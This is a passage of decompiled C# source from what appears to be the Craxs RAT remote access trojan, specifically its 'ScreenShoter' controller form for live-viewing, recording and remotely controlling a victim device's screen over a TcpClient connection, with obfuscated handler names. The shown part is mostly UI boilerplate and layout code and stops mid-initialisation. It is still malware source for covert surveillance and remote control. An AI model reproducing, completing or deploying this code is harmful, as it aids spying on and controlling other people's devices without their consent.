using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Craxs_Rat.My;
using Craxs_Rat.My.Resources;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class ScreenShoter : Form
{
	public delegate void Delegatstoper();

	public delegate void addLogback(object[] objs);

	private IContainer components;

	[CompilerGenerated]
	[AccessedThroughProperty("Livepicbox")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox _Livepicbox;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Save")]
	private DrakeUICheckBox _Save;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel4")]
	[CompilerGenerated]
	private Panel _Panel4;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	[CompilerGenerated]
	private Timer _Timer1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("refreshtimer")]
	private Timer _refreshtimer;

	[AccessedThroughProperty("presstimer")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _presstimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("scshotbtn")]
	private DrakeUIAvatar _scshotbtn;

	[AccessedThroughProperty("Dismisbtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _Dismisbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkblock")]
	[CompilerGenerated]
	private DrakeUICheckBox _checkblock;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("chkctrl")]
	private DrakeUICheckBox _chkctrl;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StartButton")]
	private DrakeUIAvatar _StartButton;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StopButton")]
	private DrakeUIAvatar _StopButton;

	[AccessedThroughProperty("DrakeUIAvatar5")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIAvatar _DrakeUIAvatar5;

	[AccessedThroughProperty("DrakeUIAvatar6")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _DrakeUIAvatar6;

	[AccessedThroughProperty("DrakeUIAvatar3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIAvatar _DrakeUIAvatar3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIAvatar4")]
	private DrakeUIAvatar _DrakeUIAvatar4;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar7")]
	[CompilerGenerated]
	private DrakeUIAvatar _DrakeUIAvatar7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIAvatar9")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIAvatar _DrakeUIAvatar9;

	[AccessedThroughProperty("pinbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _pinbtn;

	public TcpClient Client;

	public Client ScreenClass;

	public Client classClient;

	public string DownloadsFolder;

	public Size ScreenSize;

	public bool LIVE;

	public bool ScreenShotFoucs;

	public int Rnew;

	public string Title;

	private static readonly IntPtr HWND_TOPMOST;

	private const uint SWP_NOSIZE = 1u;

	private const uint SWP_NOMOVE = 2u;

	private const uint TOPMOST_FLAGS = 3u;

	private bool @checked;

	private string[] sizearry;

	private bool Swaping;

	private bool isdown;

	private List<Point> Trakpoint;

	private bool isclick;

	public const int WM_NCLBUTTONDOWN = 161;

	public const int HT_CAPTION = 2;

	public bool recordit;

	private int tiks;

	private object iscontroled;

	private bool keepmeto;

	internal virtual PictureBox Livepicbox
	{
		[CompilerGenerated]
		get
		{
			return _Livepicbox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = PictureBox1_MouseDown;
			MouseEventHandler value3 = PictureBox1_MouseUp;
			MouseEventHandler value4 = PictureBox1_MouseMove;
			PictureBox pictureBox = _Livepicbox;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
				pictureBox.MouseUp -= value3;
				pictureBox.MouseMove -= value4;
			}
			_Livepicbox = value;
			pictureBox = _Livepicbox;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
				pictureBox.MouseUp += value3;
				pictureBox.MouseMove += value4;
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("vewpnl")]
	internal virtual Panel vewpnl
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox Save
	{
		[CompilerGenerated]
		get
		{
			return _Save;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Save_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _Save;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_Save = value;
			drakeUICheckBox = _Save;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel2
	{
		[CompilerGenerated]
		get
		{
			return _Panel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel2_MouseDown;
			Panel panel = _Panel2;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel2 = value;
			panel = _Panel2;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel3_MouseDown;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	internal virtual Panel Panel4
	{
		[CompilerGenerated]
		get
		{
			return _Panel4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel4_MouseDown;
			Panel panel = _Panel4;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_Panel4 = value;
			panel = _Panel4;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal virtual DrakeUIToolTip DrakeUIToolTip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox2")]
	internal virtual PictureBox PictureBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox3")]
	internal virtual PictureBox PictureBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PBS")]
	internal virtual DrakeUIProcessBar PBS
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer refreshtimer
	{
		[CompilerGenerated]
		get
		{
			return _refreshtimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Refreshtimer_Tick;
			Timer timer = _refreshtimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_refreshtimer = value;
			timer = _refreshtimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("combosize")]
	internal virtual DrakeUIComboBox combosize
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("toptitle")]
	internal virtual Label toptitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer presstimer
	{
		[CompilerGenerated]
		get
		{
			return _presstimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Presstimer_Tick;
			Timer timer = _presstimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_presstimer = value;
			timer = _presstimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Qualtibox")]
	internal virtual DrakeUIComboBox Qualtibox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FPSBOX")]
	internal virtual DrakeUIComboBox FPSBOX
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsjkhsdawe;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar1;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar1 = value;
			drakeUIAvatar = _DrakeUIAvatar1;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar scshotbtn
	{
		[CompilerGenerated]
		get
		{
			return _scshotbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatszxsxaj;
			DrakeUIAvatar drakeUIAvatar = _scshotbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_scshotbtn = value;
			drakeUIAvatar = _scshotbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("SKtype")]
	internal virtual DrakeUIComboBox SKtype
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DrakeUIAvatar Dismisbtn
	{
		[CompilerGenerated]
		get
		{
			return _Dismisbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Dismisbtn_Click;
			DrakeUIAvatar drakeUIAvatar = _Dismisbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_Dismisbtn = value;
			drakeUIAvatar = _Dismisbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUICheckBox checkblock
	{
		[CompilerGenerated]
		get
		{
			return _checkblock;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Checkblock_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _checkblock;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_checkblock = value;
			drakeUICheckBox = _checkblock;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	internal virtual DrakeUICheckBox chkctrl
	{
		[CompilerGenerated]
		get
		{
			return _chkctrl;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Chkctrl_MouseClick;
			DrakeUICheckBox drakeUICheckBox = _chkctrl;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick -= value2;
			}
			_chkctrl = value;
			drakeUICheckBox = _chkctrl;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.MouseClick += value2;
			}
		}
	}

	public virtual DrakeUIAvatar StartButton
	{
		[CompilerGenerated]
		get
		{
			return _StartButton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar3_Click;
			DrakeUIAvatar drakeUIAvatar = _StartButton;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_StartButton = value;
			drakeUIAvatar = _StartButton;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	public virtual DrakeUIAvatar StopButton
	{
		[CompilerGenerated]
		get
		{
			return _StopButton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = StopButton_Click;
			DrakeUIAvatar drakeUIAvatar = _StopButton;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_StopButton = value;
			drakeUIAvatar = _StopButton;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DrakeUIAvatar DrakeUIAvatar5
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar5_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar5;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar5 = value;
			drakeUIAvatar = _DrakeUIAvatar5;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	public virtual DrakeUIAvatar DrakeUIAvatar6
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar6_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar6;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar6 = value;
			drakeUIAvatar = _DrakeUIAvatar6;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	public virtual DrakeUIAvatar DrakeUIAvatar3
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar3_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar3;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar3 = value;
			drakeUIAvatar = _DrakeUIAvatar3;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	public virtual DrakeUIAvatar DrakeUIAvatar4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar4_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar4;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar4 = value;
			drakeUIAvatar = _DrakeUIAvatar4;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	public virtual DrakeUIAvatar DrakeUIAvatar7
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar7_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar7;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar7 = value;
			drakeUIAvatar = _DrakeUIAvatar7;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar2_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar2 = value;
			drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("textsend")]
	internal virtual DrakeUITextBox textsend
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar9
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar9_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar9;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar9 = value;
			drakeUIAvatar = _DrakeUIAvatar9;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon pinbtn
	{
		[CompilerGenerated]
		get
		{
			return _pinbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_pinbtn = value;
			drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	static ScreenShoter()
	{
		HWND_TOPMOST = new IntPtr(-1);
	}

	public ScreenShoter()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs;
		base.FormClosing += CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg;
		base.KeyDown += ScreenShoter_KeyDown_1;
		ScreenShotFoucs = false;
		Rnew = 0;
		Title = "null";
		@checked = false;
		sizearry = new string[38]
		{
			"Auto", "2560x1600", "2048x1536", "1920x1200", "1920x1152", "1920x1080", "1600x1200", "1600x900", "1440x904", "1366x768",
			"1360x768", "1280x960", "1280x800", "1280x768", "1280x720", "1279x720", "1152x720", "1080x607", "1024x960", "1024x770",
			"1024x768", "1024x600", "960x640", "960x600", "960x540", "864x480", "854x480", "800x600", "800x480", "768x576",
			"640x480", "640x360", "480x320", "432x240", "450x300", "400x240", "320x240", "280x280"
		};
		Swaping = false;
		isdown = false;
		isclick = false;
		recordit = false;
		tiks = 0;
		iscontroled = false;
		keepmeto = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.ScreenShoter));
		this.Save = new DrakeUI.Framework.DrakeUICheckBox();
		this.Label2 = new System.Windows.Forms.Label();
		this.Label1 = new System.Windows.Forms.Label();
		this.Livepicbox = new System.Windows.Forms.PictureBox();
		this.vewpnl = new System.Windows.Forms.Panel();
		this.Panel8 = new System.Windows.Forms.Panel();
		this.toptitle = new System.Windows.Forms.Label();
		this.PBS = new DrakeUI.Framework.DrakeUIProcessBar();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.DrakeUIAvatar9 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
		this.PictureBox3 = new System.Windows.Forms.PictureBox();
		this.PictureBox2 = new System.Windows.Forms.PictureBox();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
		this.textsend = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.DrakeUIAvatar7 = new DrakeUI.Framework.DrakeUIAvatar();
		this.combosize = new DrakeUI.Framework.DrakeUIComboBox();
		this.Label7 = new System.Windows.Forms.Label();
		this.Label6 = new System.Windows.Forms.Label();
		this.Qualtibox = new DrakeUI.Framework.DrakeUIComboBox();
		this.Label5 = new System.Windows.Forms.Label();
		this.FPSBOX = new DrakeUI.Framework.DrakeUIComboBox();
		this.Label4 = new System.Windows.Forms.Label();
		this.Dismisbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.SKtype = new DrakeUI.Framework.DrakeUIComboBox();
		this.scshotbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.chkctrl = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkblock = new DrakeUI.Framework.DrakeUICheckBox();
		this.StopButton = new DrakeUI.Framework.DrakeUIAvatar();
		this.StartButton = new DrakeUI.Framework.DrakeUIAvatar();
		this.Panel9 = new System.Windows.Forms.Panel();
		this.DrakeUIAvatar5 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIAvatar6 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIAvatar4 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIAvatar3 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.refreshtimer = new System.Windows.Forms.Timer(this.components);
		this.presstimer = new System.Windows.Forms.Timer(this.components);
		this.pinbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		((System.ComponentModel.ISupportInitialize)this.Livepicbox).BeginInit();
		this.vewpnl.SuspendLayout();
		this.Panel8.SuspendLayout();
		this.Panel1.SuspendLayout();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox3).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).BeginInit();
		this.Panel5.SuspendLayout();
		this.Panel6.SuspendLayout();
		this.Panel7.SuspendLayout();
		this.Panel9.SuspendLayout();
		base.SuspendLayout();
		this.Save.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.Save.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Save.Dock = System.Windows.Forms.DockStyle.Top;
		this.Save.Font = new System.Drawing.Font("Calibri", 10f);
		this.Save.ForeColor = System.Drawing.Color.SkyBlue;
		this.Save.Location = new System.Drawing.Point(0, 124);
		this.Save.Margin = new System.Windows.Forms.Padding(4);
		this.Save.Name = "Save";
		this.Save.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.Save.Size = new System.Drawing.Size(100, 69);
		this.Save.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Save.StyleCustomMode = true;
		this.Save.TabIndex = 19;
		this.Save.Text = "Save";
		this.Save.TextAlign = System.Drawing.ContentAlignment.TopLeft;
		this.DrakeUIToolTip1.SetToolTip(this.Save, "Record Screen");
		this.Label2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label2.Font = new System.Drawing.Font("Calibri", 10f);
		this.Label2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label2.Location = new System.Drawing.Point(0, 449);
		this.Label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(100, 21);
		this.Label2.TabIndex = 18;
		this.Label2.Text = "FPS .";
		this.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label1.Font = new System.Drawing.Font("Calibri", 10f);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(0, 514);
		this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(100, 21);
		this.Label1.TabIndex = 15;
		this.Label1.Text = "Qualty";
		this.Label1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Livepicbox.BackColor = System.Drawing.Color.Black;
		this.Livepicbox.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Livepicbox.Enabled = false;
		this.Livepicbox.Location = new System.Drawing.Point(0, 22);
		this.Livepicbox.Margin = new System.Windows.Forms.Padding(4);
		this.Livepicbox.Name = "Livepicbox";
		this.Livepicbox.Size = new System.Drawing.Size(392, 709);
		this.Livepicbox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.Livepicbox.TabIndex = 1;
		this.Livepicbox.TabStop = false;
		this.vewpnl.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.vewpnl.Controls.Add(this.Livepicbox);
		this.vewpnl.Controls.Add(this.Panel8);
		this.vewpnl.Dock = System.Windows.Forms.DockStyle.Fill;
		this.vewpnl.Location = new System.Drawing.Point(0, 23);
		this.vewpnl.Margin = new System.Windows.Forms.Padding(4);
		this.vewpnl.Name = "vewpnl";
		this.vewpnl.Size = new System.Drawing.Size(392, 731);
		this.vewpnl.TabIndex = 2;
		this.Panel8.BackColor = System.Drawing.Color.Black;
		this.Panel8.Controls.Add(this.toptitle);
		this.Panel8.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel8.Location = new System.Drawing.Point(0, 0);
		this.Panel8.Margin = new System.Windows.Forms.Padding(4);
		this.Panel8.Name = "Panel8";
		this.Panel8.Size = new System.Drawing.Size(392, 22);
		this.Panel8.TabIndex = 2;
		this.toptitle.Dock = System.Windows.Forms.DockStyle.Fill;
		this.toptitle.Font = new System.Drawing.Font("Calibri", 9f);
		this.toptitle.ForeColor = System.Drawing.Color.SkyBlue;
		this.toptitle.Location = new System.Drawing.Point(0, 0);
		this.toptitle.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.toptitle.Name = "toptitle";
		this.toptitle.Size = new System.Drawing.Size(392, 22);
		this.toptitle.TabIndex = 21;
		this.toptitle.Text = "...";
